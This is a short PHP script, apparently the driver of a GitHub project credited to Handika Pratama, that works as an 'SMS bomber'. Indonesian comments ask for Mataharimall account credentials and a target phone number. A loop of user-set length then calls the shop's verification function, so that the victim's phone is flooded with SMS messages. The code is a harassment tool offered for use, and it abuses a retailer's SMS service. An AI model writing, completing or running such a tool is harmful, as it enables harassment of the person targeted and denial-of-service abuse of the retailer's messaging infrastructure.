<?php
/*
    https://github.com/nee48/bomsmsmthrmall/
    Made by Handika Pratama
*/

include 'func.php';

$init = new Bom();
// Konfigurasi Akun Mataharimall
$init->email = ""; //Email Akun Mataharimall
$init->pass = ""; //Password Akun Mataharimall
$init->Login($init->email,$init->pass);

//Eksekusi Sms Boomber
$init->no = ""; //Nomer Hp tujuan Pakai awalan 62. contoh 6281xxxxxxx
$loop = ""; //Jumlah eksekusi
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
